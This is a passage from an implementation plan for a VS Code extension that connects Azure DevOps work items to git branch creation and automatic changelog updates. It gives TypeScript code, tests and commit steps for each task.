  ): Promise<AdoWorkItem[]> {
    // Step 1: WIQL query to find assigned work items
    const wiqlQuery = {
      query: `SELECT [System.Id], [System.Title], [System.State], [System.WorkItemType], [System.AssignedTo] FROM WorkItems WHERE [System.AssignedTo] = @me AND [System.State] <> 'Closed' AND [System.State] <> 'Done' ORDER BY [System.ChangedDate] DESC`
    };

    const wiqlResponse = await this.post<WiqlResult>(
      `/${project}/_apis/wit/wiql?api-version=7.1-preview.2`,
      wiqlQuery
    );

    if (!wiqlResponse.workItems || wiqlResponse.workItems.length === 0) {
      return [];
    }

    // Step 2: Fetch full details for each work item
    const ids = wiqlResponse.workItems.map(wi => wi.id).join(',');
    const batchResponse = await this.get<{ value: AdoWorkItem[] }>(
      `/_apis/wit/workitems?ids=${ids}&fields=System.Id,System.Title,System.State,System.AssignedTo,System.WorkItemType&api-version=7.1-preview.3`
    );

    return batchResponse.value || [];
  }

  async getWorkItemDetail(
    project: string,
    workItemId: number
  ): Promise<AdoWorkItem> {
    return this.get<AdoWorkItem>(
      `/_apis/wit/workitems/${workItemId}?api-version=7.1-preview.3`
    );
  }

  async addComment(
    project: string,
    workItemId: number,
    text: string
  ): Promise<AdoComment> {
    return this.post<AdoComment>(
      `/${project}/_apis/wit/workItems/${workItemId}/comments?api-version=7.1-preview.4`,
      { text }
    );
  }

  async getComments(
    project: string,
    workItemId: number
  ): Promise<AdoComment[]> {
    const response = await this.get<{ value: AdoComment[] }>(
      `/${project}/_apis/wit/workItems/${workItemId}/comments?api-version=7.1-preview.4`
    );
    return response.value || [];
  }

  /** H1 fix: detail + discussion in one call (used by Tasks 13/21/28 — defined HERE in Task 7). */
  async getWorkItemWithDiscussion(project: string, workItemId: number): Promise<{
    detail: AdoWorkItem;
    comments: AdoComment[];
    creator?: { displayName: string; uniqueName: string };
  }> {
    const detail = await this.getWorkItemDetail(project, workItemId);
    const comments = await this.getComments(project, workItemId);
    return {
      detail,
      comments,
      creator: detail.fields['System.CreatedBy'],
    };
  }

  async updateWorkItem(
    project: string,
    workItemId: number,
    fields: Array<{ op: string; path: string; value: any }>
  ): Promise<any> {
    const response = await fetch(
      `${this.baseUrl}/${project}/_apis/wit/workitems/${workItemId}?api-version=7.1-preview.3`,
      {
        method: 'PATCH',
        headers: { ...this.headers, 'Content-Type': 'application/json-patch+json' },
        body: JSON.stringify(fields),
      }
    );

    if (!response.ok) {
      throw new Error(`ADO API error: ${response.status} ${await response.text()}`);
    }

    return response.json();
  }

  private async get<T>(endpoint: string): Promise<T> {
    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      method: 'GET',
      headers: this.headers,
    });

    if (!response.ok) {
      throw new Error(`ADO API error: ${response.status} ${await response.text()}`);
    }

    return response.json() as Promise<T>;
  }

  private async post<T>(endpoint: string, body: any): Promise<T> {
    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      method: 'POST',
      headers: this.headers,
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(`ADO API error: ${response.status} ${await response.text()}`);
    }

    return response.json() as Promise<T>;
  }
}
```

**Step 3: Write tests**

Create `src/test/suite/ado/client.test.ts`:
```typescript
import * as assert from 'assert';
import { AdoClient } from '../../../ado/client';

suite('AdoClient', () => {
  test('constructs with organization and PAT', () => {
    const client = new AdoClient('testorg', 'testpat');
    assert.ok(client);
  });

  test('rejects when credentials are empty', () => {
    // Should throw or handle gracefully
    assert.throws(() => new AdoClient('', ''));
  });
});
```

**Step 4: Verify**

Run: `npm run compile`
Expected: Clean compilation

**Step 5: Commit**

```bash
git add -A
git commit -m "feat: implement Azure DevOps REST API client with PAT auth"
```

---

### Task 8: Wire ADO Client to Extension Host and ChatProvider

**Objective:** Connect the ADO client to the extension activation and wire work item fetching through the ChatViewProvider.

**Files:**
- Create: `src/services.ts` (services bundle / composition root)
- Modify: `src/extension.ts`
- Modify: `src/webview/ChatViewProvider.ts`

**Step 1: Define the services bundle**

Create `src/services.ts` — this is the composition root every consumer task
(8/10/11/13/14) builds on. It holds lazily-created service instances so the
provider never constructs its own dependencies. C6 fix: `GitService`,
`ChangelogService`, and `WorkItemsTreeProvider` are implemented in later tasks
(10/11/9), so Task 8 creates **minimal compile-ready stubs** here — they are
replaced with real implementations in their own tasks:

```typescript
import * as vscode from 'vscode';
import { AdoClient } from './ado/client';
import { getSettings, getActiveOrg } from './config/settings';

// ── C6 stubs (real implementations land in Tasks 9/10/11) ──────────
export class GitService {
  constructor(public readonly workspaceRoot: string) {}
  async isGitRepo(): Promise<boolean> { return false; }
  async getCurrentBranch(): Promise<string | null> { return null; }
  async getShortCommitHash(): Promise<string | null> { return null; }
  async hasUncommittedChanges(): Promise<boolean> { return true; }
  async createTaskBranch(_id: number, _title: string): Promise<string | null> { return null; }
}

export class ChangelogService {
  constructor(private workspaceRoot: string) {}
  async addEntry(_entry: any): Promise<string> { return `${this.workspaceRoot}/CHANGELOG.md`; }
  hasEntry(_id: number): boolean { return false; }
  formatForAdo(_entry: any): string { return ''; }
}

export interface Services {
  ado: AdoClient;
  git: GitService;
  changelog: ChangelogService;
}

/**
 * Build the services for the current workspace. Services that depend on
 * configuration (ADO org/PAT, workspace root) are recreated on
 * `onDidChangeConfiguration` / workspace change.
 */
export function createServices(context: vscode.ExtensionContext): Services {
  const settings = getSettings();
  const workspaceRoot = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath ?? '';
  // Q1: the active org is per-workspace (workspaceState), set by
  // selectActiveOrganization() and resolved by getActiveOrg(). Q2: adoServerUrl
  // (via getActiveOrgBaseUrl) supports on-prem ADO Server.
  const active = getActiveOrg(context, settings);

  // C8 fix: never throw at activation on unconfigured settings — a fresh
  // install has empty org/PAT, and Task 19's welcome view must still render.
  // AdoClient is constructed lazily (first use) so the extension activates
  // cleanly; callers guard with the refreshWorkItems config check.
  // C10 fix: use the per-org URL (active.url) — a per-org on-prem/cloud URL
  // wins over the global adoServerUrl.
  let adoClient: AdoClient | null = null;
  const ado: AdoClient = new Proxy({} as AdoClient, {
    get(_t, prop) {
      if (!adoClient) {
        adoClient = new AdoClient(active.name, settings.adoPat, active.url);
      }
      return (adoClient as any)[prop];
    },
  });

  return {
    ado,
    git: new GitService(workspaceRoot),
    changelog: new ChangelogService(workspaceRoot),
  };
}
```
Note: the lazy `ado` proxy defers `new AdoClient(...)` until the first method
call, so `activate()` never throws on empty settings. `refreshWorkItems` still
warns "configure first" before touching it.

**Step 2: Update extension.ts to build services and pass them in**

C-6 fix: `WorkItemsTreeProvider` is implemented in Task 9 — Task 8 creates a
compile-ready stub next to the other stubs in `services.ts` (or a minimal
`src/ado/WorkItemsTreeProvider.ts`):

```typescript
// src/ado/WorkItemsTreeProvider.ts — Task 8 stub (real tree in Task 9)
import * as vscode from 'vscode';
export class WorkItemsTreeProvider implements vscode.TreeDataProvider<unknown> {
  private _onDidChangeTreeData = new vscode.EventEmitter<void>();
  readonly onDidChangeTreeData = this._onDidChangeTreeData.event;
  getTreeItem(element: unknown): vscode.TreeItem { return element as vscode.TreeItem; }
  getChildren(): Thenable<unknown[]> { return Promise.resolve([]); }
  refresh(_items?: unknown[]): void { this._onDidChangeTreeData.fire(); }
}
```

```typescript
import * as vscode from 'vscode';
import { ChatViewProvider } from './webview/ChatViewProvider';
import { WorkItemsTreeProvider } from './ado/WorkItemsTreeProvider';
import { createServices, Services } from './services';
import { selectActiveOrganization } from './config/settings';

let chatProvider: ChatViewProvider;
let treeProvider: WorkItemsTreeProvider;

// H-10 fix: activate is async — the Q7 resume QuickPick (Task 24) awaits it,
// and VS Code supports returning a Promise from activate().
export async function activate(context: vscode.ExtensionContext) {
  let services = createServices(context);
  chatProvider = new ChatViewProvider(context.extensionUri, services, context, (items) => treeProvider?.refresh(items));
  context.subscriptions.push(
    vscode.window.registerWebviewViewProvider(
      ChatViewProvider.viewType,
      chatProvider
    )
  );

  treeProvider = new WorkItemsTreeProvider();
  context.subscriptions.push(
    vscode.window.registerTreeDataProvider('adoCode.workItems', treeProvider)
  );

  // Register command to refresh work items
  context.subscriptions.push(
    vscode.commands.registerCommand('adoCode.refreshWorkItems', () => {
      chatProvider.refreshWorkItems();
    })
  );

  // C10 fix: register the org-switch command (Q1) — rebuild services and the
  // provider so the AdoClient is recreated against the new org.
  context.subscriptions.push(
    vscode.commands.registerCommand('adoCode.switchOrganization', async () => {
      await selectActiveOrganization(context);
      services = createServices(context);
      chatProvider.setServices(services);
      await chatProvider.refreshWorkItems();
      vscode.window.showInformationMessage('ADO Code: switched organization.');
    })
  );

  // Keep services in sync with settings / workspace changes
  context.subscriptions.push(
    vscode.workspace.onDidChangeConfiguration((e) => {
      if (e.affectsConfiguration('adoCode')) {
        services = createServices(context);
        chatProvider.setServices(services);
      }
    })
  );
}

export function deactivate() {}
```

**Step 3: Update ChatViewProvider constructor**

Modify `ChatViewProvider` (from Task 3) to accept the services bundle:

```typescript
import { Services } from '../services';

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewType = 'adoCode.chat';
  private _view?: vscode.WebviewView;

  constructor(
    private readonly _extensionUri: vscode.Uri,
    private readonly services: Services,
    // H11: the provider needs ExtensionContext for workspaceState (Q4 history,
    // org switching) and for the tree-refresh callback (C7).
    private readonly _context: vscode.ExtensionContext,
    private readonly onItemsFetched?: (items: any[]) => void
  ) {}

  /** C10: swap the services bundle after org switch / config change. */
  public setServices(services: Services): void {
    (this as any).services = services;
    // H-5 fix: rebuild the executor too — it captured the OLD services closure.
    if (this.agentRunner) this.setAgentRunner(this.agentRunner);
  }

  /** H-4 fix: resolve the ACTIVE project from workspaceState (org switch). */
  private activeProject(): string {
    return getActiveOrg(this._context, getSettings()).project;
  }
  // ...rest unchanged
}
```

All consumer tasks (10/11/13/14) reference `this.services.ado`, `this.services.git`,
`this.services.changelog` instead of constructing dependencies.

**Step 4: Add refreshWorkItems and handle fetchWorkItems**

Add `refreshWorkItems()` method and handle `fetchWorkItems` message by calling ADO client,
then push results into BOTH the webview and the tree provider:

```typescript
async refreshWorkItems(): Promise<void> {
  // C10 fix: resolve the ACTIVE org from workspaceState (getActiveOrg), not raw settings.
  const active = getActiveOrg(this._context, getSettings());
  if (!active.name || !getSettings().adoPat || !active.project) {
    vscode.window.showWarningMessage('ADO Code: configure organization, project and PAT first.');
    return;
  }
  this.postMessage({ type: 'loading', loading: true });
  try {
    const items = await this.services.ado.getWorkItemsAssignedTo(active.project);
    // M5 fix: map AdoWorkItem → WorkItemSummary (protocol shape) before posting.
    const summaries: WorkItemSummary[] = items.map(i => ({
      id: i.id,
      title: i.fields['System.Title'] ?? '',
      state: i.fields['System.State'] ?? '',
      assignedTo: i.fields['System.AssignedTo']?.displayName ?? '',
      workItemType: i.fields['System.WorkItemType'] ?? '',
    }));
    // To webview (chat / task list)
    this.postMessage({ type: 'workItems', items: summaries });
    // To the sidebar tree view (built in Task 9) — via injected callback (C7)
    this.onItemsFetched?.(summaries);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    this.postMessage({ type: 'error', message });
    vscode.window.showErrorMessage(`ADO Code: ${message}`);
  } finally {
    this.postMessage({ type: 'loading', loading: false });
  }
}
```

In `extension.ts` `activate()`, wire the callback:
```typescript
chatProvider = new ChatViewProvider(context.extensionUri, services, context, (items) => treeProvider?.refresh(items));
```
(Note: `treeProvider` stays module-local in `extension.ts`; the provider never
touches it directly — C7. Update the Task 3 test's constructor call to match
`(extensionUri, services, context, onItemsFetched?)`.)

**Step 5: Verify**

C-6 fix: also update the Task 3 test to the new 4-param constructor:
```typescript
// src/test/suite/webview/chatViewProvider.test.ts
const provider = new ChatViewProvider({} as any, {} as any, {} as any);
assert.ok(provider);
```

Run: `npm run compile`
Expected: Clean compilation

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: add composition root and wire ADO client to provider + tree"
```

---

### Task 9: Implement Work Items Sidebar Tree View

**Objective:** Add a TreeView in the sidebar showing assigned work items with click-to-select.

**Files:**
- Create: `src/ado/WorkItemsTreeProvider.ts` (MEDIUM fix: this REPLACES the Task 8 compile-ready stub at the same path — overwrite it, do not append; the stub's `getTreeItem(element: unknown)`/`refresh(_items?)` are superseded by the real typed implementation below)
- Modify: `package.json` (add tree view contribution)
- Modify: `src/extension.ts` (register selectWorkItem/startTask commands)

**Step 1: Create TreeDataProvider**

Create `src/ado/WorkItemsTreeProvider.ts` (overwrite the Task 8 stub):
```typescript
import * as vscode from 'vscode';
import { WorkItemSummary } from '../shared/messages';

// H-6 fix: the tree consumes WorkItemSummary (what refreshWorkItems posts),
// NOT raw AdoWorkItem — matches the onItemsFetched callback type.
export class WorkItemsTreeProvider implements vscode.TreeDataProvider<WorkItemNode> {
  private _onDidChangeTreeData = new vscode.EventEmitter<WorkItemNode | undefined>();
  readonly onDidChangeTreeData = this._onDidChangeTreeData.event;

  private workItems: WorkItemSummary[] = [];

  // Data is pushed in via refresh() (called from ChatViewProvider.refreshWorkItems,
  // Task 8 Step 4). The provider itself never talks to ADO.
  constructor() {}

  refresh(items: WorkItemSummary[]): void {
    this.workItems = items;
    this._onDidChangeTreeData.fire(undefined);
  }

  getWorkItemById(id: number): WorkItemSummary | undefined {
    return this.workItems.find(wi => wi.id === id);
  }

  getTreeItem(element: WorkItemNode): vscode.TreeItem {
    return element;
  }

  getChildren(element?: WorkItemNode): WorkItemNode[] {
    if (!element) {
      return this.workItems.map(wi => new WorkItemNode(wi));
    }
    return [];
  }
}

// HIGH fix: WorkItemNode must be EXPORTED — extension.ts types command args
// with it (Task 9/28) and imports only WorkItemsTreeProvider.
export class WorkItemNode extends vscode.TreeItem {
  constructor(workItem: WorkItemSummary) {
    super(workItem.title, vscode.TreeItemCollapsibleState.None);
    this.description = `#${workItem.id}`;
    this.tooltip = `${workItem.workItemType} - ${workItem.state}`;
    this.id = String(workItem.id);
    this.iconPath = new vscode.ThemeIcon(
      workItem.state === 'Active' ? 'circle-outline' : 'check'
    );
    // NOTE: no `command` field here. Clicking a tree item fires the command
    // passed via the context menu; tree-item commands are invoked with the
    // TreeItem as the FIRST argument (not an `arguments` array — that only
    // applies to clicking). We therefore register commands that take the node.
    this.contextValue = 'workItemNode';
    this.workItemId = workItem.id;
    this.workItemTitle = workItem.title;
  }

  public readonly workItemId: number;
  public readonly workItemTitle: string;
}
```

The `contextValue` (`"workItemNode"`) is used by the menu `when` clauses in Step 2.
Both commands below receive the `WorkItemNode` as their first argument (VS Code
invokes tree-item context-menu commands with the clicked element), so they read
`node.workItemId` / `node.workItemTitle` instead of positional `(id, title)` args.

**Step 2: Register tree view in package.json**

Add to contributes.views.adoCode:
```json
{
  "id": "adoCode.workItems",
  "name": "My Work Items",
  "type": "tree"
}
```

Add command:
```json
"adoCode.selectWorkItem": {
  "command": "adoCode.selectWorkItem",
  "title": "Select Work Item"
},
"adoCode.startTask": {
  "command": "adoCode.startTask",
  "title": "Start Task",
  "icon": "$(rocket)"
},
"adoCode.switchOrganization": {
  "command": "adoCode.switchOrganization",
  "title": "Switch Organization…",
  "category": "ADO Code"
}
```

Add a context-menu item on each work item (note: NO `view/title` entry — `viewItem`
is not a valid context key in `view/title` menus, so a title-bar button conditioned
on it can never appear; the "Start Task" action only makes sense with a selected item):
```json
"menus": {
  "view/item/context": [
    {
      "command": "adoCode.startTask",
      "when": "viewItem == workItemNode",
      "group": "inline"
    },
    {
      "command": "adoCode.selectWorkItem",
      "when": "viewItem == workItemNode",
      "group": "inline"
    }
  ]
}
```

When invoked, `adoCode.startTask` calls `chatProvider.startTask(node.workItemId, node.workItemTitle)` — which triggers the git branch creation flow implemented in Task 10 (and blocks with a warning when the workspace is not a git repository).

**Step 3: Register commands in extension.ts**

The tree provider itself is already registered in Task 8 Step 2. Add the two commands (HIGH fix: import `WorkItemNode` from the tree provider module so the `node: WorkItemNode` annotations compile):
```typescript
import { WorkItemsTreeProvider, WorkItemNode } from './ado/WorkItemsTreeProvider';

context.subscriptions.push(
  vscode.commands.registerCommand('adoCode.selectWorkItem', (node: WorkItemNode) => {
    chatProvider.selectWorkItem(node.workItemId);
  }),
  vscode.commands.registerCommand('adoCode.startTask', (node: WorkItemNode) => {
    chatProvider.startTask(node.workItemId, node.workItemTitle);
  })
);
```

**Step 4: Commit**

```bash
git add -A
git commit -m "feat: add work items sidebar tree view with task actions"
```

---

### Task 10: Enforce Git Repository and Auto-Create Branch on Task Pickup

**Objective:** Ensure work happens in a git-enabled workspace and automatically create a dedicated feature branch when the developer picks up an assigned ADO work item.

**Files:**
- Create: `src/git/GitService.ts` (repo check, branch creation, status)
- Modify: `src/services.ts` (C-3: swap the Task 8 GitService stub for the real import — see Step 1 note)
- Modify: `src/webview/ChatViewProvider.ts` (hook into task pickup flow)
- Modify: `src/extension.ts` (register commands)
- Modify: `src/shared/messages.ts` (new message types)

**Step 1: Create GitService**

C-3 note: after creating the real class, replace the Task 8 stub in
`src/services.ts`:
```typescript
// services.ts — delete the stub class and swap the import:
import { GitService } from './git/GitService';
// (the Services interface and createServices() body stay unchanged)
```

Create `src/git/GitService.ts`:
```typescript
import * as vscode from 'vscode';
import * as cp from 'child_process';
import { promisify } from 'util';

const exec = promisify(cp.exec);
const execFile = promisify(cp.execFile);

export class GitService {
  // public readonly so ChatViewProvider's offerPushAndPr (Task 11) can pass
  // the cwd to git push / gh pr create.
  constructor(public readonly workspaceRoot: string) {}

  /** Verify the workspace is inside a git repository. */
  async isGitRepo(): Promise<boolean> {
    if (!this.workspaceRoot) return false;
    try {
      const { stdout } = await execFile('git', ['rev-parse', '--is-inside-work-tree'], {
        cwd: this.workspaceRoot,
      });
      return stdout.trim() === 'true';
    } catch {
      return false;
    }
  }

  /** Get the current branch name. */
  async getCurrentBranch(): Promise<string | null> {
    try {
      const { stdout } = await execFile('git', ['branch', '--show-current'], {
        cwd: this.workspaceRoot,
      });
      return stdout.trim() || null;
    } catch {
      return null;
    }
  }

  /**
   * Create a feature branch for a work item: feature/ADO-1234-fix-login-bug
   * Returns the branch name, or null if the branch already exists.
   */
  async createTaskBranch(workItemId: number, title: string): Promise<string | null> {
    const slug = title
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/^-+|-+$/g, '')
      .slice(0, 40);
    const branchName = `feature/ADO-${workItemId}-${slug}`;

    try {
      await execFile('git', ['rev-parse', '--verify', '--quiet', branchName], {
        cwd: this.workspaceRoot,
      });
      return null; // branch already exists
    } catch {
      // branch does not exist — create it
      await execFile('git', ['checkout', '-b', branchName], { cwd: this.workspaceRoot });
      return branchName;
    }
  }

  /** Check for uncommitted changes that would block a clean branch switch. */
  async hasUncommittedChanges(): Promise<boolean> {
    try {
      const { stdout } = await execFile('git', ['status', '--porcelain'], {
        cwd: this.workspaceRoot,
      });
      return stdout.trim().length > 0;
    } catch {
      return true; // assume dirty if we can't check
    }
  }

  /** Q6: short commit hash of HEAD (for changelog entries). */
  async getShortCommitHash(): Promise<string | null> {
    try {
      const { stdout } = await execFile('git', ['rev-parse', '--short', 'HEAD'], {
        cwd: this.workspaceRoot,
      });
      return stdout.trim() || null;
    } catch {
      return null;
    }
  }
}
```

**Step 2: Add message types**

Add to `src/shared/messages.ts`:
```typescript
// Webview → Extension
| { type: 'startTask'; workItemId: number; title: string }

// Extension → Webview
| { type: 'gitStatus'; isGitRepo: boolean; currentBranch: string | null; branchCreated: string | null }
| { type: 'changelogUpdated'; filePath: string }
```

**Step 3: Wire into ChatViewProvider task pickup flow**

In `ChatViewProvider`, add a `startTask(workItemId, title)` handler plus a
shared `ensureGitReady(workItemId)` helper (H3 fix — Task 25's
`startTaskWithAgent` reuses it):

```typescript
// C-4 fix: declare the active work item HERE (first use), once — Tasks 11/13
// refine it but must NOT re-declare (TS2300 duplicate member).
private activeWorkItem?: WorkItemContext;

/** H3: git pre-flight shared by startTask (Task 10) and startTaskWithAgent (Task 25).
 *  Returns true if it's safe to proceed. */
private async ensureGitReady(workItemId: number): Promise<boolean> {
  const settings = getSettings();
  // 1) Git repo required?
  if (settings.gitRequireGitRepo && !(await this.services.git.isGitRepo())) {
    vscode.window.showWarningMessage('ADO Code requires a git-enabled workspace. Open a folder inside a git repository to pick up tasks.');
    return false;
  }
  // 2) Uncommitted changes?
  if (settings.gitRequireCleanTree && await this.services.git.hasUncommittedChanges()) {
    const choice = await vscode.window.showWarningMessage('ADO Code: you have uncommitted changes. Switch branches anyway?', { modal: true }, 'Yes');
    if (choice !== 'Yes') return false;
  }
  // 3) Create the task branch
  if (settings.gitCreateBranchOnTaskStart) {
    const title = this.activeWorkItem?.title ?? `Work item ${workItemId}`;
    const created = await this.services.git.createTaskBranch(workItemId, title);
    this.postMessage({ type: 'gitStatus', isGitRepo: true, currentBranch: await this.services.git.getCurrentBranch(), branchCreated: created });
  }
  return true;
}

async startTask(workItemId: number, title: string): Promise<void> {
  this.activeWorkItem = this.activeWorkItem ?? { id: workItemId, title };
  const ok = await this.ensureGitReady(workItemId);
  if (!ok) return;
  vscode.window.showInformationMessage(`ADO Code: task ADO-${workItemId} picked up. Happy coding!`);
}
```
(The original 4-step flow — repo check, clean-tree check, branch creation,
gitStatus post — is exactly what `ensureGitReady` does; both callers share it.)

**Step 4: Register commands in extension.ts**

H4 fix: `adoCode.startTask` is registered ONCE (in Task 9) with the node-first
signature. Task 10 does NOT re-register it — it only documents that the
`chatProvider.startTask(workItemId, title)` method exists. If a separate
palette entry is wanted later, it must also take the node:

```typescript
// (no new registration here — the command from Task 9 dispatches to
//  chatProvider.startTask(node.workItemId, node.workItemTitle))
```

**Step 5: Write tests**

Create `src/test/suite/git/gitService.test.ts`:
```typescript
import * as assert from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as cp from 'child_process';
import { GitService } from '../../../git/GitService';

suite('GitService', () => {
  let tmpDir: string;

  setup(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'adocode-git-'));
    cp.execSync('git init', { cwd: tmpDir });
    cp.execSync('git config user.email test@test.com', { cwd: tmpDir });
    cp.execSync('git config user.name test', { cwd: tmpDir });
  });

  teardown(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('detects a git repository', async () => {
    const service = new GitService(tmpDir);
    assert.strictEqual(await service.isGitRepo(), true);
  });

  test('rejects a non-git directory', async () => {
    const plainDir = fs.mkdtempSync(path.join(os.tmpdir(), 'adocode-plain-'));
    try {
      const service = new GitService(plainDir);
      assert.strictEqual(await service.isGitRepo(), false);
    } finally {
      fs.rmSync(plainDir, { recursive: true, force: true });
    }
  });

  test('creates a task branch with slugified name', async () => {
    const service = new GitService(tmpDir);
    const branch = await service.createTaskBranch(1234, 'Fix login bug!');
    assert.strictEqual(branch, 'feature/ADO-1234-fix-login-bug');
    const { stdout } = cp.execSync('git branch --show-current', { cwd: tmpDir });
    assert.strictEqual(stdout.toString().trim(), branch);
  });

  test('returns null when branch already exists', async () => {
    const service = new GitService(tmpDir);
    await service.createTaskBranch(1234, 'Fix login bug!');
    const branch = await service.createTaskBranch(1234, 'Fix login bug!');
    assert.strictEqual(branch, null);
  });
});
```

**Step 6: Run tests and verify**

Run: `npm run compile && npm test`
Expected: All GitService tests PASS

**Step 7: Commit**

```bash
git add -A
git commit -m "feat: enforce git repo and auto-create task branch on pickup"
```

---

### Task 11: Auto-Update Changelog on Task Completion

**Objective:** Automatically create/update a `CHANGELOG.md` entry when a work item transitions to a completed state (Done/Closed) — one changelog entry per completed task.

**Files:**
- Create: `src/changelog/ChangelogService.ts`
- Modify: `src/services.ts` (C-3: swap the Task 8 ChangelogService stub for the real import — see Step 1 note)
- Modify: `src/webview/ChatViewProvider.ts` (hook into task completion)
- Modify: `src/git/GitService.ts` (add `commitChangelog` helper — LOW fix: the actual method name added in Step 2 is `commitChangelog`)
- Modify: `src/ado/client.ts` (use existing `addComment` for posting changelog to ADO)

**Step 1: Create ChangelogService**

C-3 note: after creating the real class, replace the Task 8 stub in
`src/services.ts`:
```typescript
// services.ts — delete the ChangelogService stub and swap the import:
import { ChangelogService } from './changelog/ChangelogService';
```

Create `src/changelog/ChangelogService.ts`:
```typescript
import * as fs from 'fs';
import * as path from 'path';

export interface ChangelogEntry {
  workItemId: number;
  title: string;
  state: string;
  date: string;
  workItemUrl: string;
  branch?: string;      // Q6: implementing branch, when detectable
  commitHash?: string;  // Q6: short commit hash, when detectable
}

export class ChangelogService {
  constructor(private workspaceRoot: string) {}

  /**
   * Append an entry under the Unreleased section of CHANGELOG.md.
   * Creates the file (with Keep-a-Changelog skeleton) if it doesn't exist.
   * Returns the changelog file path.
   */
  async addEntry(entry: ChangelogEntry): Promise<string> {
    const filePath = path.join(this.workspaceRoot, 'CHANGELOG.md');
    let content = '';

    if (fs.existsSync(filePath)) {
      content = fs.readFileSync(filePath, 'utf8');
    } else {
      content = `# Changelog

All notable changes to this project will be documented in this file.

## [Unreleased]

`;
    }

    const entryLine = `- ${entry.state} [ADO-${entry.workItemId}](${entry.workItemUrl}): ${entry.title} (${entry.date})` +
      (entry.branch || entry.commitHash
        ? ` — \`${[entry.branch, entry.commitHash].filter(Boolean).join(' @ ')}\``
        : '');

    // Insert under the first "## [Unreleased]" heading, or append at top
    const unreleasedIndex = content.indexOf('## [Unreleased]');
    if (unreleasedIndex >= 0) {
      // Guard against a missing trailing newline (indexOf -> -1), which would
      // otherwise corrupt the file by inserting at position 0.
      const newlineIdx = content.indexOf('\n', unreleasedIndex);
      const insertAt = newlineIdx === -1 ? content.length : newlineIdx + 1;
      content = content.slice(0, insertAt) + entryLine + '\n' + content.slice(insertAt);
    } else {
      content = content + '\n## [Unreleased]\n\n' + entryLine + '\n';
    }

    fs.writeFileSync(filePath, content);
    return filePath;
  }

  /** Check whether an entry for this work item already exists (idempotency). */
  hasEntry(workItemId: number): boolean {
    const filePath = path.join(this.workspaceRoot, 'CHANGELOG.md');
    if (!fs.existsSync(filePath)) return false;
    // Line-anchored match: `ADO-42` must not match `ADO-421`. Match the
    // bracketed markdown link form `[ADO-42](` OR a bare `ADO-42` at a
    // word boundary.
    const content = fs.readFileSync(filePath, 'utf8');
    return new RegExp(`\\[ADO-${workItemId}\\]\\(|ADO-${workItemId}(?!\\d)`).test(content);
  }

  /** Format the changelog entry as a comment to post on the ADO work item. */
  formatForAdo(entry: ChangelogEntry): string {
    return [
      `**Changelog entry added (${entry.state}):**`,
      ``,
      `- [ADO-${entry.workItemId}](${entry.workItemUrl}): ${entry.title} (${entry.date})`,
      ``,
      `_Added automatically by ADO Code on task completion._`,
    ].join('\n');
  }
}
```

**Step 2: Add commit helper to GitService**

Add to `src/git/GitService.ts`:
```typescript
/** Stage and commit the changelog update with a work-item reference. */
async commitChangelog(filePath: string, workItemId: number, title: string): Promise<void> {
  const message = `docs: update changelog for ADO-${workItemId} (${title})`;
  // SECURITY: use execFile with arg arrays — never interpolate the work-item
  // title into a shell string (title is attacker-controllable ADO data).
  // Also commit with a pathspec so pre-staged unrelated files aren't swept in.
  await execFile('git', ['add', filePath], {
    cwd: this.workspaceRoot,
  });
  await execFile('git', ['commit', '-m', message, '--', filePath], {
    cwd: this.workspaceRoot,
  });
}
```

**Step 3: Hook into task completion in ChatViewProvider**

**This task builds the full state-change + completion handler** (do NOT wait for
Task 14 — Task 14 only adds slash-command parsing on top). Add to `ChatViewProvider`:

```typescript
// C-4 fix: activeWorkItem is ALREADY declared in Task 10 — do NOT re-declare
// here (TS2300). This task only USES it:
//   this.activeWorkItem ?? { id: workItemId, title: ... }

/** Update a work item's state; on Done/Closed, run the changelog completion hook. */
async updateWorkItemState(workItemId: number, newState: string): Promise<void> {
  const settings = getSettings();
  const project = this.activeProject(); // H-4: active org project, not stale settings

  // C9 fix: System.History is READ-ONLY in the ADO work-item API (it's the
  // system revision log) — PATCHing it returns 400. Only patch System.State;
  // the "state changed" note goes in a discussion comment instead.
  await this.services.ado.updateWorkItem(project, workItemId, [
    { op: 'add', path: '/fields/System.State', value: newState },
  ]);
  await this.services.ado.addComment(project, workItemId, `ADO Code: state changed to **${newState}**.`);

  if (newState !== 'Done' && newState !== 'Closed') {
    this.postMessage({ type: 'workItemDetail', item: undefined as any }); // refresh not needed
    return;
  }

  // ── completion hook ─────────────────────────────────────────────
  // Q6: resolve implementing branch + short commit hash at completion time.
  const [branch, commitHash] = await Promise.all([
    this.services.git.getCurrentBranch().catch(() => null),
    this.services.git.getShortCommitHash().catch(() => null),
  ]);
  const entry = {
    workItemId,
    title: this.activeWorkItem?.title ?? `Work item ${workItemId}`,
    state: newState,
    date: new Date().toISOString().slice(0, 10), // YYYY-MM-DD
    workItemUrl: `https://dev.azure.com/${settings.adoOrganization}/${project}/_workitems/edit/${workItemId}`,
    branch: branch ?? undefined,
    commitHash: commitHash ?? undefined,
  };

  // 1) Local CHANGELOG.md (idempotent via hasEntry)
  if (settings.changelogEnabled && !this.services.changelog.hasEntry(workItemId)) {
    const filePath = await this.services.changelog.addEntry(entry);
    if (settings.changelogAutoCommit) {
      await this.services.git.commitChangelog(filePath, workItemId, entry.title);
    }
  }

  // 2) Post entry to ADO discussion thread (independent of local changelog;
  //    idempotent via comment-marker check)
  if (settings.changelogPostToAdo) {
    const comments = await this.services.ado.getComments(project, workItemId);
    const alreadyPosted = comments.some(c => c.text.includes('Changelog entry added'));
    if (!alreadyPosted) {
      await this.services.ado.addComment(project, workItemId, this.services.changelog.formatForAdo(entry));
    }
  }

  // 3) Q5: offer to push the branch + create a PR via gh CLI (opt-in)
  if (settings.gitPrOnCompletion) {
    await this.offerPushAndPr(workItemId, entry.title, branch);
  }

  this.postMessage({ type: 'changelogUpdated', filePath: 'CHANGELOG.md' });
  vscode.window.showInformationMessage(`ADO Code: ADO-${workItemId} completed — changelog updated.`);
}

